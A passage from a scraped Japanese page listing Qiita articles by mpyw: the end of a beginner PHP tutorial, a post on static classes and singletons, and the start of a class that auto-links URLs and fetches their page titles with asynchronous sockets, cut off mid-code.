<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>2<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>
</div>

<p>のように <code>&lt;?php</code> と <code>?&gt;</code> で囲んで、初めてそこでPHPのコードを記述できるようになります。 <code>echo</code> は指定したものを文字列として書き出す <strong>（出力する）</strong> 構文です。</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div></div>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span><span class="cp">&lt;?php</span>

<span class="k">echo</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>

<span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div></div>

<p>としても結果は同じです。PHPタグ内でのこういった改行・半角スぺース・タブ文字は無視されます。しかし、</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="cp">?&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div></div>

<p>のようにした場合はどうなるでしょうか？</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
2
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div></div>

<p>となると予想されると思いますが、実際には</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
2<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div></div>

<p>となります。なぜなら<ins>終了タグ直後の改行コードは削除される</ins>という特性を持っているからです。これは後々説明しますが、これによって得られるメリットがちゃんとあるので今は素直に受け止めてください。</p>

<p>なお、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div></div>

<p>のようにPHPコードだけを記述する場合、後ろのタグは省略して</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</pre></div></div>

<p>とすることが出来ます。実は<ins><a href="http://php.net/manual/ja/language.basic-syntax.phptags.php" rel="nofollow noopener" target="_blank">省略する方が推奨されています</a></ins>。</p>

<h2>
<span id="サーバー側でコードが実行される" class="fragment"></span><a href="#%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E5%81%B4%E3%81%A7%E3%82%B3%E3%83%BC%E3%83%89%E3%81%8C%E5%AE%9F%E8%A1%8C%E3%81%95%E3%82%8C%E3%82%8B"><i class="fa fa-link"></i></a>サーバー側でコードが実行される</h2>

<p>下図のような流れとなります。<br>
<a href="https://camo.qiitausercontent.com/c91af40dabba4145e9869a247fb870a85be7c7c8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f36336365393936352d306238362d313439642d396336612d3665643962346434646666342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/c91af40dabba4145e9869a247fb870a85be7c7c8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f36336365393936352d306238362d313439642d396336612d3665643962346434646666342e706e67" alt="icon_4b_192.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/63ce9965-0b86-149d-9c6a-6ed9b4d4dff4.png"></a></p>

<p>イラスト中のコードを注意してみてください。そして、<ins>ユーザー側からはPHPコードが見えない</ins>ことに気付いてください。ここがPHPとよく対比されるJavaScriptとの違いです。</p>

<table>
<thead>
<tr>
<th style="text-align: left"></th>
<th style="text-align: left">PHP</th>
<th style="text-align: left">JavaScript</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">コードがユーザーから見えるか</td>
<td style="text-align: left">見えない</td>
<td style="text-align: left">見える</td>
</tr>
<tr>
<td style="text-align: left">リロードせずに何かを行えるか</td>
<td style="text-align: left">行えない</td>
<td style="text-align: left">行える</td>
</tr>
<tr>
<td style="text-align: left">実行される場所</td>
<td style="text-align: left">サーバー上</td>
<td style="text-align: left">ユーザーのブラウザ上</td>
</tr>
</tbody>
</table>

<p>根本的に役割が全く異なるのです。違う見方で言えば、 <strong>組み合わせれば便利</strong> であるとも言えます。この講座では触れませんが、JavaScriptが主体的にPHPスクリプトに<a href="http://ja.wikipedia.org/wiki/Ajax" rel="nofollow noopener" target="_blank">Ajax</a>リクエストを送り、連携を取るという形が多くのサイトで実装されています。</p>

<h2>
<span id="webページ制作という目的に特化している" class="fragment"></span><a href="#web%E3%83%9A%E3%83%BC%E3%82%B8%E5%88%B6%E4%BD%9C%E3%81%A8%E3%81%84%E3%81%86%E7%9B%AE%E7%9A%84%E3%81%AB%E7%89%B9%E5%8C%96%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a>Webページ制作という目的に特化している</h2>

<p>JavaやC++はWindows上で動く事務ソフトウェアを開発したり、ゲームを開発したり、応用範囲が非常に広いですが、PHPで出来ることはかなり限られてきます。</p>

<ul>
<li>ユーザーからのリクエストに応じてHTMLを動的に生成して返す</li>
<li>サーバー上でデータを保存したり読み込んだりする</li>
</ul>

<p>大部分はこれらに該当するでしょう。しかし、先ほど述べたように「HTMLの中に簡単に埋め込める」という独特の強みを持っており、これらの目的に絞った仕事を行いたい場合は非常にラクに実装することが出来るでしょう。</p>

<h2>
<span id="言語のもとの名前がクソダサい" class="fragment"></span><a href="#%E8%A8%80%E8%AA%9E%E3%81%AE%E3%82%82%E3%81%A8%E3%81%AE%E5%90%8D%E5%89%8D%E3%81%8C%E3%82%AF%E3%82%BD%E3%83%80%E3%82%B5%E3%81%84"><i class="fa fa-link"></i></a>言語のもとの名前が<del>クソダサい</del>
</h2>

<p>もともとは <strong>Personal Home Page</strong> の略だったらしいです。現在は <strong>PHP - Hypertext Processor</strong> という無理矢理とってつけたような形になってしまっています。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />55位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>15</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/8e9465907f2acac40d83">PHPで静的クラス/シングルトンを実現する</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-07-25 21:06:07</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">static</span> <span class="k">class</span> <span class="nc">Hoge</span> <span class="p">{</span>

<span class="p">}</span> 
</pre></div></div>

<p>とすると文法エラーになるので、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Hoge</span> <span class="p">{</span>

    <span class="k">protected</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span> <span class="p">}</span>

<span class="p">}</span> 
</pre></div></div>

<p>としましょう。<br>
実質的にはコンストラクタが外部からアクセス不能になるので、静的クラスを定義したことになります。</p>

<p>これを応用したのがシングルトン(1個しかインスタンス生成を許可しない)。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Hoge</span> <span class="p">{</span>

    <span class="k">protected</span> <span class="k">static</span> <span class="nv">$instance</span><span class="p">;</span>

    <span class="k">protected</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span> <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">getInstance</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">static</span><span class="o">::</span><span class="nv">$instance</span> <span class="o">===</span> <span class="k">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">static</span><span class="o">::</span><span class="nv">$instance</span> <span class="o">=</span> <span class="k">new</span> <span class="k">static</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="k">static</span><span class="o">::</span><span class="nv">$instance</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span> 
</pre></div></div>

<p><strong>遅延静的束縛使ってるのでPHP5.3以降のみ。</strong></p>

<p>PHP5.2以下で継承とかどうでもよければ、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">protected</span> <span class="o">-&gt;</span> <span class="na">private</span>
<span class="k">static</span><span class="o">::</span><span class="nv">$instance</span> <span class="o">-&gt;</span> <span class="na">self</span><span class="o">::</span><span class="nv">$instance</span>
<span class="k">new</span> <span class="k">static</span> <span class="o">-&gt;</span> <span class="na">new</span> <span class="nx">self</span>
</pre></div></div>

<p>としてあげると問題なく動きます。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />56位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>14</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/e0524f199f6e357b780e">文字列中に存在するURLのタイトルを取得して自動リンクする</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-02-20 15:38:14</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[正規表現]</b> <b>[socket]</b> <b>[非同期処理]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="前書き" class="fragment"></span><a href="#%E5%89%8D%E6%9B%B8%E3%81%8D"><i class="fa fa-link"></i></a>前書き</h1>

<p><a href="http://okwave.jp/" rel="nofollow noopener" target="_blank">OKWave</a>でこんな質問があったので、いつも通りローレベルな非同期処理でパパッとやっちゃおうかってことで思い立って書いたクラスです。やっつけで書いたのでソースきれいじゃないしコメントも入ってないですがご了承ください（汗</p>

<p><strong>URLを見つけたら自動でリンク、タイトルを取得する</strong><br>
<a href="http://okwave.jp/qa/q8482830.html" class="autolink" rel="nofollow noopener" target="_blank">http://okwave.jp/qa/q8482830.html</a></p>

<h1>
<span id="作ったやつ" class="fragment"></span><a href="#%E4%BD%9C%E3%81%A3%E3%81%9F%E3%82%84%E3%81%A4"><i class="fa fa-link"></i></a>作ったやつ</h1>

<h2>
<span id="使い方" class="fragment"></span><a href="#%E4%BD%BF%E3%81%84%E6%96%B9"><i class="fa fa-link"></i></a>使い方</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">コード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">class</span> <span class="nc">UrlUtil</span> <span class="p">{</span>
    <span class="cm">/*省略*/</span>
<span class="p">}</span>

<span class="nv">$html</span> <span class="o">=</span> <span class="s1">'http://qiita.comの文字セットはちろん&lt;strong&gt;UTF-8&lt;/strong&gt;だけど・・・一応http://www.shtml.jp/mojibake/meta.htmlみたいなShift_JISのページもOKやで！！'</span><span class="p">;</span>

<span class="k">echo</span> <span class="nx">UrlUtil</span><span class="o">::</span><span class="na">escapeAndLinkify</span><span class="p">(</span><span class="nv">$html</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">結果</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"https://qiita.com"</span> <span class="na">target</span><span class="o">=</span><span class="s">"_blank"</span><span class="p">&gt;</span>Qiita - プログラマの技術情報共有サービス<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>の文字セットはちろん<span class="ni">&amp;lt;</span>strong<span class="ni">&amp;gt;</span>UTF-8<span class="ni">&amp;lt;</span>/strong<span class="ni">&amp;gt;</span>だけど・・・一応<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://www.shtml.jp/mojibake/meta.html"</span> <span class="na">target</span><span class="o">=</span><span class="s">"_blank"</span><span class="p">&gt;</span>メタタグによる文字コード指定の有効性<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>みたいなShift_JISのページもOKやで！！
</pre></div>
</div>

<h2>
<span id="特徴注意点" class="fragment"></span><a href="#%E7%89%B9%E5%BE%B4%E6%B3%A8%E6%84%8F%E7%82%B9"><i class="fa fa-link"></i></a>特徴・注意点</h2>

<ul>
<li>全てのリクエスト送信・レスポンス受信を非同期的に行います。</li>
<li>TCP接続の場合、接続も全て非同期的に行います。</li>
<li>SSL接続の場合、プラットフォームが <strong>Windows</strong> であるもしくは <strong>PHPバージョンが5.3.1未満</strong> の場合には、非同期接続が必ず失敗してしまうので、接続のみ同期的に行います。これに該当しない場合は接続も非同期的に行います。</li>
<li>
<strong>キャッシュを一切使っていない</strong> のでそのあたり工夫したほうがいいかもしれません。</li>
<li>
<strong>存在しないホストの名前解決には無駄に時間を食ってしまいます。</strong> こっちもなんとかしたいところ。</li>
<li>URLの正規表現には <strong><a href="http://qiita.com/mpyw/items/1e422848030fcde0f29a" id="reference-5aeb8d176f7fc140fbdc">「RFC3986定義の厳密なHTTP URIの正規表現」をPHP用に最適化</a></strong> したものを使っています。</li>
<li>BASIC認証が必要なURLはスルーしています。</li>
<li>タイトルが見つかった時点でレスポンス受信を中断します。</li>
<li>タイトルが最後まで見つからなかった場合はURLがそのままリンクの文字列に使われます。</li>
</ul>

<h2>
<span id="クラス定義" class="fragment"></span><a href="#%E3%82%AF%E3%83%A9%E3%82%B9%E5%AE%9A%E7%BE%A9"><i class="fa fa-link"></i></a>クラス定義</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">UrlUtil</span> <span class="p">{</span>

    <span class="k">const</span> <span class="no">STEP_WRITE_HEADERS</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">STEP_READ_HEADERS</span>  <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">STEP_READ_BODY</span>     <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">STEP_FINISHED</span>      <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>

    <span class="k">private</span> <span class="nv">$text</span>   <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$urls</span>   <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">private</span> <span class="nv">$offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">escapeAndLinkify</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$self</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">self</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">));</span>
        <span class="k">return</span> <span class="nv">$self</span><span class="o">-&gt;</span><span class="na">text</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start</span><span class="p">();</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isRunning</span><span class="p">())</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">proceed</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">replace</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">prepare</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span> <span class="o">=</span> <span class="nv">$text</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match_all</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">getRegex</span><span class="p">(),</span> <span class="nv">$text</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">,</span> <span class="nx">PREG_OFFSET_CAPTURE</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$match</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">case</span> <span class="o">!</span><span class="nv">$parts</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">:</span>
                <span class="k">case</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="s1">'user'</span><span class="p">])</span><span class="o">:</span>
                <span class="k">case</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">])</span><span class="o">:</span>
                <span class="k">case</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="s1">'host'</span><span class="p">],</span> <span class="nv">$parts</span><span class="p">[</span><span class="s1">'scheme'</span><span class="p">])</span><span class="o">:</span>
                    <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">urls</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">object</span><span class="p">)</span><span class="k">array</span><span class="p">(</span>
                <span class="s1">'string'</span>   <span class="o">=&gt;</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
                <span class="s1">'offset'</span>   <span class="o">=&gt;</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
                <span class="s1">'length'</span>   <span class="o">=&gt;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span>
                <span class="s1">'scheme'</span>   <span class="o">=&gt;</span> <span class="nv">$scheme</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="s1">'scheme'</span><span class="p">]),</span>
                <span class="s1">'host'</span>     <span class="o">=&gt;</span> <span class="nv">$parts</span><span class="p">[</span><span class="s1">'host'</span><span class="p">],</span>
                <span class="s1">'port'</span>     <span class="o">=&gt;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="s1">'port'</span><span class="p">])</span>  <span class="o">?</span> <span class="nv">$parts</span><span class="p">[</span><span class="s1">'port'</span><span class="p">]</span>  <span class="o">:</span> <span class="p">(</span><span class="nv">$scheme</span> <span class="o">===</span> <span class="s1">'https'</span> <span class="o">?</span> <span class="mi">443</span> <span class="o">:</span> <span class="mi">80</span><span class="p">),</span>
                <span class="s1">'path'</span>     <span class="o">=&gt;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="s1">'path'</span><span class="p">])</span>  <span class="o">?</span> <span class="nv">$parts</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span>  <span class="o">:</span> <span class="s1">'/'</span><span class="p">,</span> 
                <span class="s1">'query'</span>    <span class="o">=&gt;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="s1">'query'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$parts</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">,</span>
            <span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">start</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">urls</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">createSocket</span><span class="p">(</span><span class="nv">$url</span><span class="p">))</span> <span class="p">{</span>
                <span class="nb">unset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">urls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">urls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">fp</span>     <span class="o">=</span> <span class="nv">$fp</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">urls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">step</span>   <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">STEP_WRITE_HEADERS</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">urls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">isRunning</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">urls</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">step</span> <span class="o">!==</span> <span class="nx">self</span><span class="o">::</span><span class="na">STEP_FINISHED</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">proceed</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$read</span> <span class="o">=</span> <span class="nv">$write</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$except</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">urls</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span> <span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">step</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">case</span> <span class="nx">self</span><span class="o">::</span><span class="na">STEP_FINISHED</span><span class="o">:</span>
                    <span class="k">continue</span> <span class="mi">2</span><span class="p">;</span>
                <span class="k">case</span> <span class="nx">self</span><span class="o">::</span><span class="na">STEP_WRITE_HEADERS</span><span class="o">:</span>
                    <span class="nv">$write</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">;</span>
                    <span class="k">continue</span> <span class="mi">2</span><span class="p">;</span>
                <span class="k">default</span><span class="o">:</span>
                    <span class="nv">$read</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">;</span>
            <span class="p">}</span> 
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nb">stream_select</span><span class="p">(</span><span class="nv">$read</span><span class="p">,</span> <span class="nv">$write</span><span class="p">,</span> <span class="nv">$except</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">200000</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">urls</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
                <span class="nv">$url</span><span class="o">-&gt;</span><span class="na">step</span>   <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">STEP_FINISHED</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">urls</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span> <span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">step</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">case</span> <span class="nx">self</span><span class="o">::</span><span class="na">STEP_WRITE_HEADERS</span><span class="o">:</span>
                    <span class="nb">isset</span><span class="p">(</span><span class="nv">$write</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="k">and</span> <span class="nx">self</span><span class="o">::</span><span class="na">writeHeaders</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="nx">self</span><span class="o">::</span><span class="na">STEP_READ_HEADERS</span><span class="o">:</span>
                    <span class="nb">isset</span><span class="p">(</span><span class="nv">$read</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="k">and</span> <span class="nx">self</span><span class="o">::</span><span class="na">readHeaders</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">default</span><span class="o">:</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$read</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> <span class="p">{</span>
                        <span class="nx">self</span><span class="o">::</span><span class="na">readBody</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">step</span> <span class="o">!==</span> <span class="nx">self</span><span class="o">::</span><span class="na">STEP_FINISHED</span> <span class="k">and</span> <span class="nb">feof</span><span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">))</span> <span class="p">{</span>
